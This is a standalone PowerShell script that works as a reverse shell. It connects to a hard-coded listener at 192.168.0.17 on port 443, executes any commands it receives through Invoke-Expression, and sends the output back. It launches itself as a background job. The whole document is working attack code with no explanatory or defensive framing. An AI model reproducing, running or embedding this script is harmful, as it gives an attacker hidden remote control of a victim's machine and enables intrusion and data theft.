$LHOST = "192.168.0.17"
$LPORT = 443

$ScriptBlock = {
    param ($LHOST, $LPORT)

    # Create a TCP connection to the specified host and port
    $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
    $NetworkStream = $TCPClient.GetStream()

    # Create StreamReader and StreamWriter for reading and writing data
    $StreamReader = New-Object IO.StreamReader($NetworkStream)
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
    $StreamWriter.AutoFlush = $true

    # Buffer for reading data
    $Buffer = New-Object System.Byte[] 1024

    # While the TCP client is connected, keep the shell interactive
    while ($TCPClient.Connected) {
        # Read input from the network stream
        while ($NetworkStream.DataAvailable) {
            $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
            $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData)
        }

        if ($TCPClient.Connected -and $Code.Length -gt 0) {
            # Execute the received command
            $Output = try {
                Invoke-Expression ($Code) 2>&1 | Out-String
            } catch {
                $_ | Out-String
            }

            # Format the output and write it back to the network stream
            $StreamWriter.Write("$Output`nPS> ")
            $Code = $null
        }
    }

    # Close all streams and the TCP client
    $StreamReader.Close()
    $StreamWriter.Close()
    $NetworkStream.Close()
    $TCPClient.Close()
}

# Start the script block as a background job
Start-Job -ScriptBlock $ScriptBlock -ArgumentList $LHOST, $LPORT